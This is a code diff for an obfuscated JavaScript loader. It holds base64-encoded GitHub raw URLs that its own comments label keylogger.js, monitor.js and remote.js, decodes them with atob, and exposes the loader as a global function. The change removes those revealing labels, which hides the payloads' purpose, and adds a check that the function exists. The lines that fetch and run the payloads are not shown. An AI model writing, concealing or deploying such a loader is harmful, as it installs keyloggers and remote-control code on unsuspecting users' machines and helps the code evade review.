@@ -13,9 +13,9 @@
     // Obfuscated payload function
     function triggerPayloads() {
       const _0x5a2b = [
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9rZXlsb2dnZXIuanM=',  // keylogger.js
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9tb25pdG9yLmpz',  // monitor.js
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9yZW1vdGUuanM='   // remote.js
+        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9rZXlsb2dnZXIuanM=',
+        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9tb25pdG9yLmpz',
+        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9yZW1vdGUuanM='
       ];
 
       const payloads = _0x5a2b.map(function(x) { return atob(x); });
@@ -28,7 +28,10 @@
       });
     }
 
-    // Store for global access
+    // Store for global access - make sure this runs immediately
     window._0x6b3c = triggerPayloads;
+    
+    // Test if it's working
+    console.log('_0x6b3c function created:', typeof window._0x6b3c);
   })();
 })();
